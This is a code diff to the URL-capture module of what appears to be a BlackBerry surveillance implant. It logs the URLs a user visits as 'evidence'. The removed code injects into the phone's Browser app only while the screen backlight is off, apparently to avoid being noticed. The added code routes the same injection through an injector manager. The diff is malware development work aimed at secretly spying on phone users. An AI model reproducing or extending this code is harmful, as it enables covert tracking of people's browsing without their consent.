@@ -12,8 +12,6 @@ package blackberry.module;
 import java.util.Date;
 import java.util.Vector;
 
-import net.rim.device.api.system.Backlight;
-import blackberry.AppListener;
 import blackberry.Device;
 import blackberry.Messages;
 import blackberry.config.ConfModule;
@@ -21,10 +19,9 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.interfaces.ApplicationObserver;
-import blackberry.interfaces.BacklightObserver;
+import blackberry.injection.InjectorManager;
+import blackberry.injection.injectors.group.UrlGroupInjector;
 import blackberry.manager.ModuleManager;
-import blackberry.module.url.AppInjectorBrowser;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -32,15 +29,10 @@ import blackberry.utils.WChar;
 /**
  * The Class UrlAgent.
  */
-public final class ModuleUrl extends BaseModule implements ApplicationObserver,
-        BacklightObserver {
+public final class ModuleUrl extends BaseModule {
     //#ifdef DEBUG
     static Debug debug = new Debug("ModUrl", DebugLevel.VERBOSE);
     //#endif
-
-    String appName = "Browser";
-
-    AppInjectorBrowser appInjector;
 
     private boolean seen = true;
     private boolean unsupported = false;
@@ -59,13 +51,13 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         if (Device.getInstance().atLeast(6, 0)) {
             seen = false;
         }
-        
+
         if (Device.getInstance().atLeast(7, 0)) {
             unsupported = true;
         }
-        
-        setPeriod(APP_TIMER_PERIOD);
-        setDelay(APP_TIMER_PERIOD);
+
+        setPeriod(NEVER);
+        setDelay(NEVER);
         return true;
     }
 
@@ -78,28 +70,8 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
             return;
         }
 
-        AppListener.getInstance().addApplicationObserver(this);
-        AppListener.getInstance().addBacklightObserver(this);
-
-        try {
-            appInjector = AppInjectorBrowser.getInstance();
-
-        } catch (Exception ex) {
-            //#ifdef DEBUG
-            debug.error("actualStart: " + ex);
-            //#endif
-        }
-
-        if (!Backlight.isEnabled() && !appInjector.isInfected() && seen) {
-            //#ifdef DEBUG
-            debug.info("injecting");
-            //#endif
-
-            appInjector.infect();
-            if (Device.getInstance().atLeast(6, 0)) {
-                seen = false;
-            }
-        }
+        UrlGroupInjector.enableGroup(true);
+        InjectorManager.getInstance().start();
     }
 
     public synchronized void actualStop() {
@@ -107,8 +79,8 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         debug.trace("actualStop");
         //#endif
 
-        AppListener.getInstance().removeApplicationObserver(this);
-        AppListener.getInstance().removeBacklightObserver(this);
+        UrlGroupInjector.enableGroup(false);
+        InjectorManager.getInstance().stop();
     }
 
     boolean infecting = false;
@@ -122,52 +94,6 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
             return;
         }
 
-        if (appInjector.isInfected() && Backlight.isEnabled()
-                && isAppForeground) {
-            //#ifdef DEBUG
-            debug.info("actualRun, infected, enabled, foreground");
-            //#endif
-
-            appInjector.callMenuInContext();
-        } else {
-            //#ifdef DEBUG
-            debug.trace("actualRun: infected=" + appInjector.isInfected()
-                    + " backlight=" + Backlight.isEnabled() + " foreground="
-                    + isAppForeground);
-            //#endif
-        }
-    }
-
-    boolean isAppForeground;
-
-    public void onApplicationChange(String startedName, String stoppedName,
-            String startedMod, String stoppedMod) {
-        if (startedName != null && startedName.indexOf(appName) >= 0) {
-            //#ifdef DEBUG
-            debug.trace("onApplicationChange: foreground");
-            //#endif
-            isAppForeground = true;
-            seen = true;
-        } else {
-            //#ifdef DEBUG
-            debug.trace("onApplicationChange: not foreground");
-            //#endif
-            isAppForeground = false;
-        }
-    }
-
-    public void onBacklightChange(boolean on) {
-        if (!on && !appInjector.isInfected() && seen) {
-            //#ifdef DEBUG
-            debug.info("onBacklightChange, injecting");
-            //#endif
-
-            appInjector.infect();
-
-            if (Device.getInstance().atLeast(6, 0)) {
-                seen = false;
-            }
-        }
     }
 
     public synchronized void saveUrl(String url) {
@@ -195,9 +121,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
 
     //#ifdef DEBUG
     public void disinfect() {
-        if (appInjector != null) {
-            appInjector.disinfect();
-        }
+
     }
     //#endif
 }
